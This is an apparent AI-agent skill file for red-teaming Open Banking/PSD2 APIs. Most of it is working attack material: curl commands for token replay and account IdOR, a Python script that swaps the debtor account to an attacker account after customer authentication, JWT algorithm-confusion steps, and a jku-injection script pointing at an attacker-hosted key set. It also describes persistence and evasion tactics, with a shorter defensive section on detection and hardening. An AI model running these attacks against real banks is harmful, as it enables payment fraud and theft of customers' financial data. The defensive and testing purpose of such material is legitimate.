---
name: open-banking-attack
description: Open Banking / PSD2 / Open Finance attacks — FAPI (Financial-grade API), OpenID Connect for Financial APIs, OAuth2 PKCE, Strong Customer Authentication (SCA) bypass, AIS/PIS/CBPII API abuse, payment redirection, consent manipulation. Covers UK Open Banking, US FDX, Brazil Open Finance, India Account Aggregator, Singapore MAS APIX, Australia CDR. Includes 2024-2025 incidents (Token Hijacking, IdOR on AIS endpoints, PIS redirect manipulation).
origin: kali-claw Wave 10 (v0.1.41) — 2026-06-28
version: "0.2.0.2"
compatibility:
  kali_version: "2025.2"
  python_version: ">=3.11"
allowed-tools:
  - burpsuite
  - mitmproxy
  - httpx
  - curl
  - jq
  - python3
  - oidc-debugger
  - jwt-tool
  - oauth2-proxy
  - postman
  - gh
metadata:
  domain: fintech-banking
  tool_count: 13
  guide_count: 2
  mitre: "TA0001-Initial Access, TA0006-Credential Access, TA0009-Collection, T1552-Unsecured Credentials, T1550-Use Alternate Authentication Material, T1185-Man in the Browser"
  last_reviewed: "2026-07-26"
---

# Open Banking Attack Skill

> Red-team operations against Open Banking / Open Finance infrastructure — the modern OAuth2/FAPI stack that powers UK Open Banking, PSD2, Brazil Open Finance, US FDX, India Account Aggregator, and more. Targets: TPPs (Third-Party Providers), banks (ASPSPs), consent APIs, and the customer journey from consent → data access → payment initiation.

## Summary

Open Banking (formerly PSD2) is the API-driven banking standard that lets customers share account data with Third-Party Providers (TPPs) and initiate payments via API. As of 2024-2026:

- **UK Open Banking**: ~10M active users, 400+ regulated TPPs
- **EU PSD2/PSD3**: every EU bank exposes AIS/PIS APIs
- **Brazil Open Finance**: 800M+ API calls/month
- **India Account Aggregator**: 1.4B+ AA transactions
- **US FDX**: 200M+ accounts accessible via FDX API
- **Singapore MAS APIX**: cross-border pilots
- **Australia CDR**: Consumer Data Right, mandatory for banks

The standard stack is:
- **FAPI 2.0** (Financial-grade API) — OAuth2 + OIDC profile for finance
- **MTLS sender-constrained tokens** — prevents token theft
- **DPoP** (Demonstration of Proof-of-Possession) — JWT-bound tokens
- **PAR** (Pushed Authorization Requests) — request object by reference
- **JARM** (OAuth2 Authorization Response Mode) — JWT response
- **JWS / JWE** — signed and encrypted requests/responses

But implementation is uneven. This skill covers the realistic attack surface:

- **SCA (Strong Customer Authentication) bypass** — redirect URI manipulation, app-to-app fraud
- **AIS (Account Information Service) abuse** — IdOR on account endpoints, consent scope escalation
- **PIS (Payment Initiation Service) attacks** — debtor account swap, creditor account manipulation
- **Consent manipulation** — re-using consents, forging consent IDs
- **OAuth2 profile attacks** — PKCE bypass, state reuse, code interception
- **JWT signature forgery** — alg confusion, jku injection
- **TPP onboarding fraud** — eIDAS cert theft, sandbox-to-prod escalation
- **App-to-app (a2a) payment fraud** — redirect manipulation
- **Open Banking Screen Scraping** vs API scrapers

Distinct from adjacent skills:

| Skill | Scope |
|-------|-------|
| `api-security` | Generic REST API attacks (BOLA, BFLA, mass assignment) |
| `web-auth-bypass` | Web auth (cookie, session, CSRF) |
| `crypto-attacks` | Algorithm-level (RSA, AES, signatures) |
| **`open-banking-attack`** (this) | **Financial-grade OAuth2 / FAPI / SCA / AIS / PIS stack** |

## Use Cases

### Reconnaissance & Discovery

1. **Identify ASPSP** (Account Servicing Payment Services Provider) — bank's Open Banking endpoints
2. **Discover OIDC / FAPI endpoints** via `.well-known/openid-configuration`
3. **Enumerate TPPs** in registry (FCA registry for UK, OBIE for Brazil)
4. **Map consent APIs** — `/consents`, `/consents/{id}`, `/payments`
5. **Identify SCA flows** — redirect vs decoupled vs embedded
6. **Locate FAPI profile** — FAPI 1.0 vs 2.0

### Initial Access

7. **TPP registration fraud** — register as TPP, get certs, test in sandbox
8. **eIDAS QWAC/QSeal cert theft** — leaked from compromised TPP
9. **Compromised customer OAuth2 flow** — code interception via redirect URI manipulation
10. **App-to-app (a2a) payment interception** — pre-fund scam
11. **Phishing for Open Banking consent** — fake TPP consent page
12. **Compromised TPP** — supply chain via TPP-ASPSP integration

### Privilege Escalation

13. **Consent scope escalation** — requested `accounts` but accessed `payments`
14. **AIS → PIS pivot** — use AIS consent to initiate payments
15. **Single-account consent → multi-account access** — IdOR on `/accounts/{id}`
16. **Consent re-use across TPPs** — consent IDs not scoped to TPP
17. **Refresh token abuse** — infinite token lifetime via refresh loop

### Persistence

18. **Long-lived consent** — `recurringIndicator: true`, `validToDate: 2099-12-31`
19. **Silent refresh token rotation** — keep session alive without customer
20. **Consent refresh without re-SCA** — exploit SCA exemption rules
21. **Backdoor TPP registration** — register TPP with attacker cert

### Defense Evasion

22. **PAR request object obfuscation** — JWT with complex nested claims
23. **JWT alg confusion** — HS256 with attacker HMAC key
24. **JARM-only response mode** — hide response in JWT
25. **MTLS-bypassed endpoints** — find endpoints that don't enforce mTLS

### Collection & Exfiltration

26. **AIS bulk read** — `/accounts/{id}/transactions` for years of history
27. **Consented balances** — `/balances` for all accounts under consent
28. **Beneficiary lists** — `/accounts/{id}/beneficiaries`
29. **Standing orders** — `/accounts/{id}/standing-orders`
30. **Direct debits** — `/accounts/{id}/direct-debits`

### Impact

31. **Unauthorized payment initiation** — PIS attack moves funds
32. **Account takeover** — AIS + beneficiary swap + PIS
33. **Mass account info harvest** — broad TPP access across customers
34. **Customer privacy violation** — bulk AIS read
35. **Money laundering facilitation** — PIS for layering

## Core Tools

### Open Banking Standards (Targets)

| Standard | Region | Notes |
|----------|--------|-------|
| **FAPI 1.0 Baseline** | UK, EU, BR | OAuth2 profile for finance |
| **FAPI 1.0 Advanced** | UK, EU | mTLS or DPoP sender-constrained |
| **FAPI 2.0** | UK, EU, BR | Security profile (2024+) |
| **FAPI CIBA** | EU | Client-Initiated Backchannel Authentication |
| **OIDC for FAPI** | Global | Identity layer |
| **UK OBIE** | UK | UK Open Banking Implementation Entity |
| **PSD2 / PSD3** | EU | Payment Services Directive |
| **RTS** | EU | Regulatory Technical Standards on SCA |
| **OB BR** | Brazil | Open Finance Brazil |
| **FDX** | US | Financial Data Exchange |
| **India AA** | India | Account Aggregator |
| **MAS APIX** | Singapore | Cross-border pilots |
| **CDR** | Australia | Consumer Data Right |

### Roles (in scope as targets)

| Role | Acronym | Description |
|------|---------|-------------|
| Account Servicing PSP | **ASPSP** | The bank |
| Third-Party Provider | **TPP** | API consumer |
| Payment Initiation PSP | **PISP** | PIS provider |
| Account Information PSP | **AISP** | AIS provider |
| Card-Based Payment IIP | **CBPII** | Funds confirmation |
| Payment Instrument Issuer | **PII** | For card-based payments |

### Offensive Toolkit

```bash
# OAuth2 / OIDC
httpx -u https://bank.example.com/.well-known/openid-configuration -status-code -title
curl -s https://bank.example.com/.well-known/openid-configuration | jq .

# OAuth2 flow inspection
mitmproxy --mode reverse:https://tpp.example.com
burpsuite

# JWT analysis
jwt-tool $(cat token.jwt) -X a  # algorithm confusion
jwt-tool $(cat token.jwt) -T   # tamper
jwt_tool $(cat token.jwt) -X k # key confusion

# Token replay
curl -sk https://bank.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $TOKEN" \
  --cert client.crt --key client.key

# Consent enum
curl -sk https://bank.example.com/open-banking/v3.1/pisp/domestic-payment-consents \
  -H "Authorization: Bearer $TOKEN" \
  -d @consent.json

# Open Banking RFC tools
oauth2-proxy --config tpp.cfg
oidc-debugger
```

## Methodology

### Phase 1 — Reconnaissance

```bash
# Discover Open Banking endpoints via well-known
curl -s https://bank.example.com/.well-known/openid-configuration | jq .

# Output includes:
# - authorization_endpoint
# - token_endpoint
# - userinfo_endpoint
# - jwks_uri
# - scopes_supported
# - code_challenge_methods_supported (should include S256 for FAPI)
# - request_object_signing_alg_values_supported (should include PS256)

# Check FAPI profile support
curl -s https://bank.example.com/.well-known/openid-configuration | jq '.scopes_supported'

# UK Open Banking: well-known URLs follow pattern
curl -s https://matls-auth.example.com/.well-known/openid-configuration
curl -s https://api.example.com/open-banking/v3.1/aisp/accounts
```

### Phase 2 — TPP Registration

To legitimately test Open Banking, you need a TPP identity:

1. Register sandbox account on bank's developer portal
2. Generate eIDAS QWAC + QSeal certs (sandbox)
3. Register OAuth2 client (TPP onboarding)
4. Get `client_id`, `client_secret`, SSA (Software Statement Assertion)

```bash
# Register TPP (UK OBIE pattern)
curl -X POST https://register.example.com/v1.1/register/ \
  -H 'Content-Type: application/jwt' \
  -d @ssa.jwt
```

### Phase 3 — Consent Flow Testing

Test the AIS consent flow:

1. AIS client creates consent via API
2. Bank returns consent ID
3. Customer redirected to bank for SCA
4. Customer approves consent
5. Bank returns authorization code
6. TPP exchanges code for access token
7. TPP uses token to read accounts

### Phase 4 — SCA Bypass

Try to skip SCA:

- **Contactless** exemption abuse (low-value payment without SCA)
- **Trusted beneficiary** list abuse
- **Corporate payment** SCA exemption abuse
- **Redirect URI manipulation** to capture code without SCA completion

### Phase 5 — AIS Abuse

With valid AIS consent:

1. Enumerate account IDs (IdOR)
2. Read transactions beyond consent scope
3. Read balances on accounts not in consent
4. Read beneficiary lists, standing orders, direct debits

### Phase 6 — PIS Abuse

With PIS consent:

1. Initiate payment to attacker-controlled creditor
2. Modify debtor account after consent
3. Modify amount after consent
4. Chain to multiple payments

### Phase 7 — Token Abuse

Test access token security:

- mTLS enforcement (does token work without cert?)
- DPoP enforcement (does token work without DPoP proof?)
- Token replay across endpoints
- Refresh token abuse

## Practical Steps

### Step A — Discover OIDC config

```bash
curl -s https://auth.example.com/.well-known/openid-configuration | jq . > oidc-config.json

# Inspect
jq '. | keys' oidc-config.json
jq '.request_object_signing_alg_values_supported' oidc-config.json
# Expect: ["PS256", "ES256"] for FAPI
# If "none" — FAPI not enforced

jq '.code_challenge_methods_supported' oidc-config.json
# Expect: ["S256"] for FAPI
# If "plain" — PKCE downgrade possible

jq '.scopes_supported' oidc-config.json
# Expect: openid, accounts, payments, fundsconfirmations
```

### Step B — Test PAR (Pushed Authorization Requests)

```bash
# FAPI requires PAR (pushed authorization)
curl -sk -X POST https://auth.example.com/par \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --cert client.crt --key client.key \
  -d 'response_type=code&client_id=REPLACE_WITH_YOUR_CLIENT_ID&redirect_uri=https://tpp.example.com/cb&scope=accounts&code_challenge=REPLACE_WITH_YOUR_CHALLENGE&code_challenge_method=S256&state=abc123'

# Returns: request_uri
# If PAR not enforced — old OAuth2 flow with request object still allowed (downgrade)
```

### Step C — Test mTLS sender-constrained tokens

```bash
# Get token with mTLS cert
TOKEN=$(curl -sk -X POST https://auth.example.com/token \
  --cert client.crt --key client.key \
  -d 'grant_type=authorization_code&code=...&redirect_uri=...&client_id=...' | jq -r .access_token)

# Use token WITH mTLS cert
curl -sk https://api.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $TOKEN" \
  --cert client.crt --key client.key

# Now try WITHOUT mTLS cert (token should fail)
curl -sk https://api.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $TOKEN"

# If second succeeds — mTLS not enforced, token replayable
```

### Step D — AIS IdOR

```bash
# With consent for account A
TOKEN=...
ACCOUNT_A=REPLACE_WITH_YOUR_ACCOUNT_A_ID

# Try to access account B (not in consent)
ACCOUNT_B=REPLACE_WITH_YOUR_ACCOUNT_B_ID
curl -sk "https://api.example.com/open-banking/v3.1/aisp/accounts/$ACCOUNT_B/transactions" \
  -H "Authorization: Bearer $TOKEN" \
  --cert client.crt --key client.key

# If 200 OK — IdOR, account B accessible
# If 403 — proper isolation
```

### Step E — PIS debtor account manipulation

```python
# Create consent
import requests
consent = {
    "Data": {
        "Initiation": {
            "InstructionIdentification": "kali-1",
            "EndToEndIdentification": "kali-1",
            "InstructedAmount": {"Amount": "1.00", "Currency": "GBP"},
            "CreditorAccount": {
                "SchemeName": "UK.OBIE.SortCodeAccountNumber",
                "Identification": "12345612345678"
            },
            "DebtorAccount": {
                "SchemeName": "UK.OBIE.SortCodeAccountNumber",
                "Identification": "REPLACE_WITH_YOUR_CUSTOMER_SORT_ACCT"  # customer's account
            }
        }
    },
    "Risk": {}
}

r = requests.post(
    'https://api.example.com/open-banking/v3.1/pisp/domestic-payment-consents',
    json=consent,
    headers={'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'},
    cert=('client.crt', 'client.key')
)

consent_id = r.json()['Data']['ConsentId']
print(f'Consent: {consent_id}')

# After SCA, modify debtor account in payment submission
submission = {
    "Data": {
        "ConsentId": consent_id,
        "Initiation": {
            ...,
            "DebtorAccount": {
                "SchemeName": "UK.OBIE.SortCodeAccountNumber",
                "Identification": "ATTACKER_SORT_ACCT"  # swapped
            }
        }
    }
}

r = requests.post(
    'https://api.example.com/open-banking/v3.1/pisp/domestic-payments',
    json=submission,
    headers={'Authorization': f'Bearer {token}'},
    cert=('client.crt', 'client.key')
)
# If payment initiated from wrong account — debtor account manipulation succeeded
```

### Step F — JWT alg confusion

```bash
# Get bank's public key
curl -s https://auth.example.com/jwks | jq '.keys[0]'

# Convert to RSA PEM
echo '... modulus ...' | base64 -d > modulus.bin
python3 -c "
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
n = int.from_bytes(open('modulus.bin', 'rb').read(), 'big')
e = 65537
pub = rsa.RSAPublicNumbers(e, n).public_key()
pem = pub.public_bytes(encoding=serialization.Encoding.PEM,
                       format=serialization.PublicFormat.SubjectPublicKeyInfo)
open('bank-pub.pem', 'wb').write(pem)
"

# Use JWT tool for alg confusion
jwt_tool $TOKEN -X a -S hs256 -k bank-pub.pem

# If success — alg confusion, signature forged
```

### Step G — jku header injection

```python
# Craft JWT with jku pointing to attacker JWKS
import jwt
import json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Generate attacker RSA key
priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
priv_pem = priv.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)
pub = priv.public_key()
pub_jwk = {  # JWK format
    'kty': 'RSA',
    'kid': 'kali-1',
    'n': '...',
    'e': 'AQAB'
}

# Serve attacker JWKS
# https://attacker.example.com/jwks.json

# Craft JWT with jku header
token = jwt.encode(
    {'sub': 'admin', 'groups': ['admin']},
    priv_pem,
    algorithm='PS256',
    headers={'jku': 'https://attacker.example.com/jwks.json', 'kid': 'kali-1'}
)
print(token)

# Bank validates jku URL → fetches attacker JWKS → verifies with attacker pub key
```

### Step H — App-to-app (a2a) payment interception

```bash
# Customer uses a2a payment (e.g., pay small business via Open Banking)
# Customer's banking app receives redirect from TPP
# Intercept via mitmproxy

mitmproxy --mode regular
# Or Burp Suite

# Capture a2a redirect
# Look for: 
# GET https://tpp.example.com/return?code=abc&state=xyz
# Customer taps "Pay" in banking app → bank sends auth code to TPP

# If redirect can be replayed → fraudulent payment
```

## Defense Perspective

### Detection

**ASPSP (Bank)**
- Audit consent creation / approval / usage
- Alert on AIS read beyond consent scope (multi-account reads)
- Alert on PIS to new creditor (above customer baseline)
- Alert on rapid consent creation across many customers (TPP scanning)
- Detect mTLS-mismatched token use (token from cert A used with cert B)

**TPP**
- Audit customer consent approval / withdrawal
- Detect unexpected eIDAS cert use (cert from different TPP)
- Audit token creation / refresh patterns

**Customer-side**
- Banking app: alert on a2a payment to new payee
- Push notification for any AIS/PIS event

### Hardening

1. **FAPI 2.0 Security Profile** — full enforcement
2. **PAR** — Pushed Authorization Requests mandatory
3. **mTLS sender-constrained tokens** — no exceptions
4. **JARM** — JWT responses prevent query string tampering
5. **DPoP** — backup if mTLS unavailable
6. **JWT `alg` allowlist** — only PS256/ES256, no `none`
7. **JWKS URL allowlist** — bank's JWKS only
8. **Consent ID cross-TPP check** — consent ID tied to TPP client_id
9. **SCA for every payment** — no exemptions for new payees
10. **Consent limits** — max 12 months, renewal requires re-SCA

### Incident Response

When Open Banking compromise suspected:

1. **Revoke TPP certs** — eIDAS QWAC/QSeal rotation
2. **Revoke all consents** — bank-wide consent revocation
3. **Block affected customer accounts** — pause PIS
4. **Audit recent payments** — last 30 days, flag for review
5. **Notify regulator** — FCA (UK), BaFin (DE), etc.
6. **Notify affected customers** — within 72h (GDPR)
7. **Forensics** — log analysis for token replay patterns
8. **Post-mortem** — profile adherence audit, JWKS rotation

## Detection Methods

### Open Banking API Audit
- **TPP anomaly**: Third-Party Provider making unusual API calls; new TPP registration with anomalous pattern.
- **SCA bypass**: Strong Customer Authentication bypassed via legacy auth; consent reuse.
- **Consent abuse**: Consent granted for one service but used for another; consent for AIS used to initiate PIS.
- **eIDAS QWAC forgery**: TLS certificate from TPP with mismatched organization.

### SIEM Detection Rules
- **Splunk SPL**: `index=openbanking sourcetype=ob:api | stats dc(endpoint) by tpp_id | where dc > 10`
- **API gateway logging**: Open Banking API gateway (Kong, Apigee) with custom security policies.

## Defense Evasion Techniques

### TPP Compromise Stealth
- **Use legitimate TPP credentials**: Steal TPP eIDAS credentials; appears as legitimate TPP.
- **AIS to PIS pivot**: Use AIS (read-only) consent to gather data; pivot to PIS (payment) via separate flow.
- **SCA exemption abuse**: Use low-value payment exemption (≤30 EUR); avoid SCA threshold.

### FAPI Bypass
- **PAR (Pushed Authorization Request) downgrade**: Force fallback to non-PAR; bypass request validation.
- **JARM (JWT Authorization Response Mode) manipulation**: Modify response mode to leak auth code.
- **DPoP (Demonstrating Proof-of-Possession) bypass**: Some implementations don't strictly validate DPoP token binding.
- **mTLS bypass**: Exploit mTLS implementation flaws; some APIs don't strictly validate client cert.

## References

- OpenID Foundation FAPI 2.0 — https://openid.net/specs/fapi-2_0.html
- FAPI 1.0 Advanced — https://openid.net/specs/openid-financial-api-part-2-1_0.html
- OAuth 2.0 Pushed Authorization Requests (RFC 9126)
- OAuth 2.0 Demonstrating Proof-of-Possession (DPoP) (RFC 9449)
- OAuth 2.0 JWT-Secured Authorization Response Mode (JARM)
- OAuth 2.0 Mutual-TLS Client Authentication (RFC 8705)
- UK Open Banking Standard — https://standards.openbanking.org.uk/
- UK OBIE Security Profile — https://openbanking.atlassian.net/
- PSD2 Directive (EU) 2015/2366
- PSD3 Proposal (2023)
- EBA RTS on SCA — Commission Delegated Regulation (EU) 2018/389
- Brazil Open Finance — https://openfinancebrasil.org.br/
- US FDX API — https://financialdataexchange.org/
- India Account Aggregator — https://sahamati.org.in/
- Singapore MAS APIX — https://apix.asia/
- Australia CDR — https://consumerdatastandards.gov.au/
- OWASP FAPI Cheat Sheet — https://cheatsheetseries.owasp.org/
- CISA — *Open Banking Threat Brief* (2024)
- "Open Banking Security" (Ana Isabel Canhoto, 2024)
- MITRE ATT&CK — T1185 Man in the Browser, T1552 Unsecured Credentials
